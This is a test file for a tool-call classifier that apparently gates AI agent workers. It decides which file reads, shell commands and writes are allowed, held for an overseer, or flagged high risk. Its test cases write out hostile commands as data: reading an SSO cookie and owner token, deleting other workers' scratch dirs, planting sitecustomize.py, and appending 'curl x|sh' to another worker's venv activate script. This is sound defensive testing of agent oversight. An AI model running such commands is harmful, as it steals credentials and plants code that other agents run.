import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { join } from "path";
import { classifyToolCall, parseShellSnapshot, type FloorProbes, type ShellDefinitions } from "./classify.js";
import type { FloorVerdict } from "./gate.js";
import { buildLaunchFloorConfig } from "./launch.js";
import { exampleCorpProfile } from "../org-profile/fixtures/example-corp.js";

/*
 * The per-launch scratch dirs under `~/.cache/standup-scratch` hold workers'
 * venvs, monitor scripts and evidence files, not owner-side secrets. With the
 * config the launcher builds, a worker reads and runs what is in its own
 * launch's dir freely; a read of another launch's dir, or of the scratch root
 * as a whole, is an ordinary hold Persona decides (not HIGH RISK). The
 * owner's credentials and Standup's secrets dir stay HIGH RISK, and so does
 * running a scratch script that reads the org's SSO cookie, though a plain read
 * of that script is allowed.
 */

const HOME = join("/", "local", "home", "u");
const DATA = join(HOME, ".local", "share", "standup");
const ROOT = join(DATA, "worktrees", "standup", "feat-1");
const COMMON = join("/", "fake", "repo", ".git");
const ID = "a1a1a1a1-0000-4000-8000-0000000000a1";
const OTHER = "a2a2a2a2-0000-4000-8000-0000000000a2";
const SCRATCH = join(HOME, ".cache", "standup-scratch");
const S = join(SCRATCH, ID);
const O = join(SCRATCH, OTHER);
const COOKIE_CODE = `import os\nprint(open(os.path.expanduser("~/.corp-sso/cookie")).read())\n`;

const config = {
  ...buildLaunchFloorConfig(
    { launchId: ID, root: ROOT, workerToken: "x".repeat(64), replyPublicKey: "test" },
    { HOME, XDG_CACHE_HOME: join(HOME, ".cache"), DB_PATH: join(DATA, "standup.db"), STANDUP_INSTALL_DIR: join("/", "fake", "install") }
  ),
  // The org vocabulary that names the SSO cookie (a test fixture profile).
  orgProfile: exampleCorpProfile(),
};

const DIRS = ["/", "/tmp", ROOT, S, join(S, "venv", "bin"), join(S, "bin"), O, join(DATA, "secrets"), join(HOME, ".corp-sso")];
const FILES: Record<string, string> = {
  [join(ROOT, ".git")]: `gitdir: ${COMMON}/worktrees/feat-1\n`,
  [join(S, "a.png")]: "x",
  [join(S, "x.py")]: "print(1)\n",
  [join(S, "cookie.py")]: COOKIE_CODE,
  [join(S, "venv", "bin", "python")]: "",
  [join(S, "bin", "monitor.sh")]: "#!/bin/sh\necho ok\n",
  [join(ROOT, "reads-other.test.ts")]: `import { readFileSync } from "fs";\ntest("x", () => console.log(readFileSync("${O}/a.txt", "utf8")));\n`,
  [join(ROOT, "writes-other.test.ts")]: `import { writeFileSync } from "fs";\ntest("x", () => writeFileSync("${O}/run.sh", "x"));\n`,
  [join(O, "a.txt")]: "x\n",
  [join(O, "b.png")]: "x",
  [join(DATA, "secrets", "owner.token")]: "t",
  [join(HOME, ".corp-sso", "cookie")]: "c",
};

function probes(): Partial<FloorProbes> {
  const dirs = new Set<string>(DIRS);
  for (const f of [...Object.keys(FILES), ...DIRS]) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(join(ROOT, ".git"));
  const defs: ShellDefinitions = { aliases: new Map(), functions: new Map() };
  parseShellSnapshot("", defs);
  const executables = new Set([join(S, "venv", "bin", "python"), join(S, "bin", "monitor.sh")]);
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: (dir) => (dir === ROOT ? COMMON : null),
    readFile: (p) => (p in FILES ? { ok: true, text: FILES[p]! } : { ok: false, reason: "missing" }),
    exists: (p) => p in FILES || dirs.has(p),
    executable: (p) => executables.has(p),
    isDirectory: (p) => dirs.has(p),
    listDir: () => null,
    realpath: (p) => (p in FILES || dirs.has(p) ? p : null),
    lstat: (p) => (p in FILES ? { symlink: false, file: true, nlink: 1 } : dirs.has(p) ? { symlink: false, file: false, nlink: 1 } : null),
    homeDir: () => HOME,
    env: (name) => ({ HOME, TMPDIR: S })[name],
    shellDefinitions: () => defs,
    awsAccount: () => null,
    now: () => Date.now(),
    gitTree: () => null,
    gitAncestor: () => null,
    gitBlob: () => ({ ok: false, reason: "missing" }),
  };
}

let savedTmp: string | undefined;
beforeEach(() => {
  savedTmp = process.env.TMPDIR;
});
afterEach(() => {
  if (savedTmp === undefined) delete process.env.TMPDIR;
  else process.env.TMPDIR = savedTmp;
});

const call = (toolName: string, toolInput: Record<string, unknown>): FloorVerdict => {
  process.env.TMPDIR = S;
  return classifyToolCall({ toolName, toolInput, cwd: ROOT }, config, probes());
};
const shape = (v: FloorVerdict) => (v.action === "hold" ? { action: v.action, highRisk: v.ownerReserved === true, category: v.category } : { action: v.action });

test("the launcher's config keeps the scratch root private, not protected", () => {
  expect({ scratchDir: config.scratchDir, protectedPaths: config.protectedPaths.filter((p) => p.startsWith(SCRATCH)), privatePaths: config.privatePaths?.filter((p) => p.path === SCRATCH).map((p) => p.category) }).toEqual({
    scratchDir: S,
    protectedPaths: [],
    privatePaths: ["standup-ops"],
  });
});

describe("the launch's own scratch dir", () => {
  test.each([
    ["Read", { file_path: join(S, "x.py") }],
    ["Bash", { command: `cat ${S}/x.py` }],
    ["Bash", { command: `ls ~/.cache/standup-scratch/${ID}` }],
    ["Bash", { command: `find ${S} -name '*.png'` }],
    ["Bash", { command: `${S}/venv/bin/python ${S}/x.py` }],
    ["Bash", { command: `~/.cache/standup-scratch/${ID}/venv/bin/python -c 'print(1)'` }],
    ["Bash", { command: `${S}/bin/monitor.sh` }],
    ["Bash", { command: `bash ${S}/bin/monitor.sh` }],
    ["Bash", { command: `cd ${S} && bin/monitor.sh` }],
    ["Write", { file_path: join(S, "n.txt"), content: "x" }],
    ["Edit", { file_path: join(S, "x.py"), old_string: "1", new_string: "2" }],
    ["Bash", { command: `echo hi > ${S}/out.log` }],
  ])("%s %p is allowed", (tool, input) => {
    expect(call(tool, input)).toEqual({ action: "allow" });
  });
});

describe("another launch's scratch dir and the scratch root", () => {
  test.each([
    ["Read", { file_path: join(O, "a.txt") }],
    ["Bash", { command: `cat ${O}/a.txt` }],
    ["Bash", { command: `ls ${O}` }],
    ["Bash", { command: `find ~/.cache/standup-scratch -name '*.png'` }],
    ["Bash", { command: `find ${SCRATCH} -name '*.png'` }],
    ["Bash", { command: `ls ~/.cache/standup-scratch` }],
    ["Glob", { pattern: `${SCRATCH}/*/*.png` }],
    ["Bash", { command: `python3 -c 'import os; print(os.listdir(os.path.dirname("${S}")))'` }],
    ["Bash", { command: `cd ${S} && cat ../${OTHER}/a.txt` }],
    ["Bash", { command: "bun test reads-other.test.ts" }],
  ])("%s %p is a normal hold, not high risk", (tool, input) => {
    expect(shape(call(tool, input))).toEqual({ action: "hold", highRisk: false, category: "standup-ops" });
  });

  test("the hold says where the read lands, for Persona", () => {
    const v = call("Read", { file_path: join(O, "a.txt") });
    expect(v.action === "hold" ? v.reason : "").toBe(`Read of ${O}/a.txt, which is in or above other launches' scratch dirs (their venvs, scripts and evidence), which Persona decides whether this worker may open`);
  });

  // A note, log or image written there is one that worker reads, not runs.
  test.each([
    ["Write", { file_path: join(O, "n.txt"), content: "x" }],
    ["Bash", { command: `echo hi > ${O}/out.log` }],
    ["Bash", { command: `cd ${S} && echo hi > ../${OTHER}/new.log` }],
    ["Bash", { command: `cd ~/.cache && npx playwright screenshot https://x -ostandup-scratch/${OTHER}/new.png` }],
  ])("a non-executable file written there is a normal hold: %s %p", (tool, input) => {
    expect(shape(call(tool, input))).toEqual({ action: "hold", highRisk: false, category: "standup-ops" });
  });

  // That worker runs what is in its own scratch dir unread, so a write there plants code it runs.
  test.each([
    ["Write", { file_path: join(O, "venv", "lib", "sitecustomize.py"), content: "x" }],
    ["Bash", { command: `rm -rf ${O}` }],
    ["Bash", { command: "rm -rf ~/.cache/standup-scratch" }],
    ["Bash", { command: `cd ${S}/.. && cp ${S}/x.py ${OTHER}/sitecustomize.py` }],
    ["Bash", { command: "bun test writes-other.test.ts" }],
    ["Bash", { command: `tar -xf a.tar -C ${O}` }],
    ["Bash", { command: `cd ~/.cache && tar -xf a.tar -C standup-scratch/${OTHER}` }],
    ["Bash", { command: `unzip a.zip -d ${O}/venv` }],
    ["Bash", { command: "rsync -a src/ ~/.cache/" }],
    ["Bash", { command: `python3 -c 'import os\nb=os.path.join(os.environ["HOME"],".cache","standup-scratch")\nfor d in os.listdir(b): open(os.path.join(b,d,"venv/bin/activate"),"a").write("x")'` }],
  ])("a write or delete there stays high risk: %s %p", (tool, input) => {
    expect(shape(call(tool, input))).toEqual({ action: "hold", highRisk: true, category: "floor-tamper" });
  });

  // The floor can't place the write, so it can't tell whose dir it lands in: Persona sees both the write and the root it names.
  test("a write to a computed path under the root holds for Persona, naming the write", () => {
    const v = call("Bash", { command: "echo 'curl x|sh' >> ~/.cache/standup-scratch/$(cat /tmp/id)/venv/bin/activate" });
    expect(shape(v)).toEqual({ action: "hold", highRisk: false, category: "standup-ops" });
    expect(v.action === "hold" ? v.reason : "").toContain("a path the floor can't resolve");
  });
});

describe("owner-side secrets", () => {
  test.each([
    ["Read", { file_path: join(HOME, ".corp-sso", "cookie") }],
    ["Bash", { command: `cat ${DATA}/secrets/owner.token` }],
    ["Bash", { command: `python3 ${S}/cookie.py` }],
  ])("%s %p stays high risk", (tool, input) => {
    expect(shape(call(tool, input))).toEqual({ action: "hold", highRisk: true, category: "floor-tamper" });
  });

  test.each([
    ["Read", { file_path: join(S, "cookie.py") }],
    ["Bash", { command: `cat ${S}/cookie.py` }],
    ["Bash", { command: `head -n 5 ~/.cache/standup-scratch/${ID}/cookie.py` }],
  ])("a scratch script that names the cookie, only read: %s %p is allowed", (tool, input) => {
    expect(call(tool, input)).toEqual({ action: "allow" });
  });
});
